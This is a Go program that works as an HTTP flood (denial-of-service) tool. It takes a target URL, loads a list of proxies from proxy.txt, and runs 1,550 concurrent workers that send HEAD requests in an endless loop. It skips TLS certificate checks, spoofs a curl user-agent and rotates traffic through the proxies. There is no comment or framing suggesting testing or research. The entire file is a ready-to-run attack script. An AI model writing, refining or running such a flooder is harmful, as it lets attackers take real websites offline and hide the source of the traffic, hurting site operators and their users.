package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	workers        = 1550
	requestTimeout = 3 * time.Second
	userAgent      = "curl/8.4.0"
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func main() {
	if len(os.Args) < 2 {
		os.Exit(1)
	}
	targetURL := os.Args[1]

	var proxyURLs []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxyURLs = append(proxyURLs, p)
			}
		}
	}

	if len(proxyURLs) == 0 {
		proxyURLs = append(proxyURLs, nil)
	}

	clients := make([]*http.Client, len(proxyURLs))
	for i, proxyURL := range proxyURLs {
		transport := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   2 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			DisableKeepAlives:   false,
			MaxIdleConns:        10000,
			MaxIdleConnsPerHost: 5000,
			MaxConnsPerHost:     0,
			IdleConnTimeout:     60 * time.Second,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS13,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2"},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    true,
			TLSHandshakeTimeout:   1 * time.Second,
			ResponseHeaderTimeout: 1 * time.Second,
			ExpectContinueTimeout: 0,
		}

		if proxyURL != nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}

		clients[i] = &http.Client{
			Transport: transport,
			Timeout:   requestTimeout,
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		cl := clients[i%len(clients)]
		go func(c *http.Client) {
			defer wg.Done()
			for ctx.Err() == nil {
				req, _ := http.NewRequest("HEAD", targetURL, nil)
				req.Header.Set("User-Agent", userAgent)
				resp, err := c.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(cl)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	cancel()
	wg.Wait()
}
